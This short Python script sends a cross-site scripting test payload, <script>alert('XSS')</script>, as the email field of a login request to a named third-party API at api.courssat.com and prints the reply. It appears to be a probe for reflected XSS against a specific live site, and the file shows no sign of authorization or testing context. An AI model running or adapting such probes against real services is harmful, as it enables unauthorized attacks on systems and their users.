import requests

url = "https://api.courssat.com/api/User/Login"
payload = "<script>alert('XSS')</script>"

data = {
       'email': payload,
       'password': 'password'
   }

response = requests.post(url, data=data)
print(response.text)